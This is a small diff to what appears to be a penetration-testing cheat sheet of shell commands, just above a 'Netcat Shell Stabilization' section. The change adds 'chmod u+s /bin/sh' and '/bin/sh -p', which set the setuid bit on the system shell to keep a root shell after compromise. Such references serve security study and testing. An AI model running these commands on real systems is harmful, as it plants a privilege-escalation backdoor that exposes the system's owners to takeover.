@@ -4,7 +4,10 @@
 /bin/bash -i
 ```
 ```
-/bin/bash -p
+chmod u+s /bin/sh
+```
+```
+/bin/sh -p
 ```
 
 ## Netcat Shell Stabilization
